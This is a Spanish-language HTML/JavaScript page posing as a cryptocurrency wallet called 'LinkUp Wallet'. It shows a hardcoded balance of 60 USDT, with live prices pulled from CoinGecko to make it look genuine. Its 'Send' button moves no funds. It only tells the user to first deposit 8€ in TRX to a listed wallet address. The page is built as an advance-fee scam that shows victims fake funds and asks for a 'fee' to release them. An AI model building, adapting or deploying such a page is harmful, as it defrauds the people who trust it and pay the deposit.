<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>LinkUp Wallet</title>
  <style>
    body {
      background-color: #1e1e1e;
      color: #ffffff;
      font-family: 'Arial', sans-serif;
      margin: 0;
      padding: 0;
    }
    .container {
      padding: 20px;
      max-width: 500px;
      margin: auto;
    }
    .saldo {
      text-align: center;
      font-size: 32px;
      margin-top: 30px;
      font-weight: bold;
    }
    .cambio24h {
      text-align: center;
      color: #00ffae;
      font-size: 14px;
      margin-bottom: 20px;
    }
    .botones {
      display: flex;
      justify-content: space-around;
      margin: 20px 0;
    }
    button {
      background-color: #2a2a2a;
      color: #fff;
      padding: 10px 15px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      flex: 1;
      margin: 0 5px;
    }
    .crypto-list {
      background-color: #2a2a2a;
      border-radius: 10px;
      padding: 15px;
    }
    .crypto-item {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 10px 0;
      border-bottom: 1px solid #444;
    }
    .crypto-item:last-child {
      border-bottom: none;
    }
    .crypto-logo {
      width: 24px;
      height: 24px;
      margin-right: 10px;
    }
    .crypto-name {
      display: flex;
      align-items: center;
    }
    .popup {
      background-color: #333;
      padding: 20px;
      border-radius: 10px;
      margin-top: 20px;
    }
    .popup p {
      margin: 10px 0;
    }
    .copyable {
      background-color: #444;
      padding: 10px;
      border-radius: 8px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="saldo" id="saldo">60 USDT</div>
    <div class="cambio24h" id="cambio24h">+0.10 € (+0.2%) en 24h</div>

    <div class="botones">
      <button onclick="mostrarRecibir()">Recibir</button>
      <button onclick="mostrarEnviar()">Enviar</button>
    </div>

    <div class="crypto-list" id="cryptoList"></div>

    <div id="popup" class="popup" style="display: none;"></div>
  </div>

  <script>
    const monedas = [
      { nombre: 'USDT', logo: 'https://cryptologos.cc/logos/tether-usdt-logo.png?v=026', balance: 60 },
      { nombre: 'TRX', logo: 'https://cryptologos.cc/logos/tron-trx-logo.png?v=026', balance: 60 },
      { nombre: 'SOL', logo: 'https://cryptologos.cc/logos/solana-sol-logo.png?v=026', balance: 0 },
      { nombre: 'BTC', logo: 'https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=026', balance: 0 },
      { nombre: 'ETH', logo: 'https://cryptologos.cc/logos/ethereum-eth-logo.png?v=026', balance: 0 }
    ];

    async function obtenerPrecios() {
      const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tether,tron,solana,bitcoin,ethereum&vs_currencies=eur&include_24hr_change=true');
      const data = await res.json();

      const lista = document.getElementById('cryptoList');
      lista.innerHTML = '';

      monedas.forEach(moneda => {
        let id = moneda.nombre.toLowerCase();
        if (id === 'usdt') id = 'tether';
        if (id === 'trx') id = 'tron';

        const precio = data[id]?.eur || 0;
        const cambio = data[id]?.eur_24h_change?.toFixed(2) || 0;
        const cambioTexto = `${cambio > 0 ? '+' : ''}${cambio}%`;

        const item = `
          <div class="crypto-item">
            <div class="crypto-name">
              <img src="${moneda.logo}" class="crypto-logo">
              ${moneda.nombre}
            </div>
            <div>${moneda.balance} - ${precio.toFixed(2)} €</div>
          </div>`;

        lista.innerHTML += item;

        if (moneda.nombre === 'USDT') {
          document.getElementById('saldo').innerText = `${moneda.balance} USDT`;
          document.getElementById('cambio24h').innerText = `${(precio * moneda.balance - 60).toFixed(2)} € (${cambioTexto}) en 24h`;
        }
      });
    }

    function mostrarRecibir() {
      document.getElementById('popup').style.display = 'block';
      document.getElementById('popup').innerHTML = `
        <h3>Recibir</h3>
        <p><strong>USDT TRX:</strong></p>
        <div class="copyable" onclick="copiar('TMacSeNh7ZzuMTXgNccQbBD3wewyYSYSjn')">TMacSeNh7ZzuMTXgNccQbBD3wewyYSYSjn</div>
        <p><strong>SOLANA:</strong></p>
        <div class="copyable" onclick="copiar('65yX9MGe62PXhNrgPFo7u3RqpyZjmDmF3r8k1HGAGfM4')">65yX9MGe62PXhNrgPFo7u3RqpyZjmDmF3r8k1HGAGfM4</div>
      `;
    }

    async function mostrarEnviar() {
      const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=eur');
      const precioTRX = res.ok ? (await res.json()).tron.eur : 0;
      const cantidad = (8 / precioTRX).toFixed(2);

      document.getElementById('popup').style.display = 'block';
      document.getElementById('popup').innerHTML = `
        <h3>Enviar</h3>
        <p>USDT TRX - Tienes: 60</p>
        <p>Primero debes depositar 8€ en TRX</p>
        <p>Equivale a: <strong>${cantidad} TRX</strong></p>
        <div class="copyable" onclick="copiar('TKNBhiB4j8N6cm3hJ1VycdcQ4GiyrXuZmE')">TKNBhiB4j8N6cm3hJ1VycdcQ4GiyrXuZmE</div>
      `;
    }

    function copiar(texto) {
      navigator.clipboard.writeText(texto).then(() => alert('Dirección copiada'));
    }

    obtenerPrecios();
    setInterval(obtenerPrecios, 60000);
  </script>
</body>
</html>
